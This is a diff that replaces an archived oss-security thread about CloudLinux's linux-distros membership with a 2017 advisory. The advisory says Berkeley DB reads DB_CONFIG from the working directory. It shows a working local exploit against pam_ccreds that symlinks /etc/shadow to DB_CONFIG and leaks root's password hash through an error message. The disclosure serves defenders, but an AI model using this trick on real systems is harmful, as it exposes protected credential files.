@@ -1,69 +1,31 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/02/5
-Message-ID: <C882188A65B78D4489A202C0BEAD24D04B334B79@Exchange4.dnpexchange.com>
-Date: Sun, 2 Jul 2017 18:16:18 +0000
-From: Bobby Broughton <bobby@...ciselymanaged.com>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: RE: linux-distros list membership application - CloudLinux
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/10/1
+Message-ID: <20170610220613.mfmmpjey2l4aptcj@jwilk.net>
+Date: Sun, 11 Jun 2017 00:06:13 +0200
+From: Jakub Wilk <jwilk@...lk.net>
+To: oss-security@...ts.openwall.com
+Subject: Berkeley DB reads DB_CONFIG from cwd
 Content-Type: text/plain; charset=utf-8
 
-Hey all!
+Apparently Berkeley DB reads the DB_CONFIG configuration file from the current 
+working directory by default[*]. This is surprising and AFAICT undocumented.
 
-I run two businesses, one of which hosts other hosting providers, and we are heavy users of CloudLinux. They work very hard to contribute to fixing issues whether the upstream has fixed it or not, and I see tremendous value in that. I think they should be added.
+Here's how to exploit it against pam_ccreds:
 
-Thanks!
+    $ cat /etc/shadow
+    cat: /etc/shadow: Permission denied
+    $ ln -sf /etc/shadow DB_CONFIG
+    $ /sbin/ccreds_chkpwd moo < /dev/null
+    BDB1584 line 1: root:$1$QRCEVRMX$sPppjXE42AZnUPuEWf87D.:17327:0:99999:7:::: incorrect name-value pair
 
-Bobby
+(The above was tested on Debian jessie.)
 
------Original Message-----
-From: Solar Designer [mailto:solar@...nwall.com] 
-Sent: Sunday, July 2, 2017 2:08 PM
-To: oss-security@...ts.openwall.com
-Subject: Re: [oss-security] linux-distros list membership application - CloudLinux
+In the past, nss_db was also exploitable:
+CVE-2010-0826
 
-Hi all,
 
-I am inclined to add CloudLinux to the linux-distros list unless there are well-reasoned objections.  I'd appreciate any comments.
+[*] More precisely, this seem to happen when you call db_create() with 
+dbenv=NULL; or if you use the dbm_open() function.
 
-On Sun, Jul 02, 2017 at 05:29:25PM +0300, Igor Seletskiy wrote:
-> I would like to apply for membership in linux-distros list for 
-> CloudLinux OS. Please, see application attached.
-
-Thank you for posting this, Igor.
-
-I am most concerned about your answer to:
-
-> 4. Not be (only) downstream or a rebuild of another distro (or else we 
-> need convincing additional justification of how the list membership 
-> would enable you to release fixes sooner, presumably not relying on 
-> the upstream distro having released their fixes first?)
-
-> Our kernel has significant amount of changes comparing to OpenVZ 
-> kernel We also do slight modifications to Apache web server, ship 
-> customized versions of PHP (multiple versions), python, ruby, MySQL 
-> and MariaDB that are  packaged by us, and not taken from upstream.
-
-So are you saying that you'll release fixes sooner (once you're on the linux-distros list) only for this subset of packages that are modified or packaged by you?  What about the rest?
-
-> We would be happy to help with administrative tasks:
-> 
->    1. Promptly review new issue reports for meeting the list's requirements
->    and confirm receipt of the report and, when necessary, inform the reporter
->    of any issues with their report (e.g., obviously not actionable by the
->    distros) and request and/or propose any required yet missing information
->    (most notably, a tentative public disclosure date)
->    2. If the proposed public disclosure date is not within list policy,
->    insist on getting this corrected and propose a suitable earlier 
-> date
-> 
-> And possibly more in the future, as we have a better understanding of 
-> the amount of work needed to handle those tasks.
-> We will need some handholding at first to make sure we do things correctly.
-
-OK.  You'll likely need to choose additional/other tasks very soon since these trivial ones will likely transfer to another new distro joining, if one requests membership and meets the criteria shortly after you.
-
-> Please, find PGP related info
-
-Thanks.  Out of the people you listed, you and Konstantin appear to have been on oss-security for a long while, but Leonid doesn't appear to be subscribed - or is he?  If not, he probably needs to subscribe now.
-
-Alexander
+-- 
+Jakub Wilk
